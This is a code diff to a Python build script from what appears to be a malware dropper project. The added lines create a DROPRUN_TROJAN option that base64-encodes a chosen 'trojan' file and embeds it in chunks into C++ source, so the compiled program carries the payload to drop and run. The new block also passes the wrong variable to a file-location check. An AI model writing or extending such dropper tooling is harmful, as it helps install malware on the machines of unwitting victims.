@@ -4,6 +4,7 @@ sys.setrecursionlimit(1000000)      # for bigger files
 emailSenderLastPath = ''
 FAST_TEST = False
 CUSTOM_FILE = False
+DROPRUN_TROJAN = False
 for line in open('../commons/common.h', 'r').readlines():
     if '#define DEBUG' in line and 'true' in line:
         FAST_TEST = True
@@ -11,6 +12,8 @@ for line in open('../commons/common.h', 'r').readlines():
         emailSenderLastPath = line.split('"')[1].replace('\\\\', '\\')
     if '#define DROP_CUSTOM_FILE' in line and 'true' in line:
         emailSenderLastPath = True
+    if '#define DROPRUN_TROJAN_FILE' in line and 'true' in line:
+        DROPRUN_TROJAN = True
 
 
 def split_str(seq, chunk, skip_tail=False):
@@ -130,6 +133,16 @@ for line in main_cppRead.readlines():
         customFileContent = base64.b64encode(open(customFilePath, 'rb').read()).decode()
         open('preCompilation.tmp', 'a').write("customfile=" + customFilePath + "\n")
         for subContent in split_str(customFileContent, 500, False):
+            content += '"'+subContent+'"\n'
+        content += ';\n'
+        continue
+    if line.split('=')[0] == 'string TrojanFileContent ' and line.split('=')[1] != ' \n' and DROPRUN_TROJAN:
+        content += 'string TrojanFileContent = \n'
+        trojanFilePath = line.split('"')[1]
+        checkFileLocation(customFilePath, i)
+        trojanFileContent = base64.b64encode(open(trojanFilePath, 'rb').read()).decode()
+        open('preCompilation.tmp', 'a').write("trojanfile=" + trojanFilePath + "\n")
+        for subContent in split_str(trojanFileContent, 500, False):
             content += '"'+subContent+'"\n'
         content += ';\n'
         continue
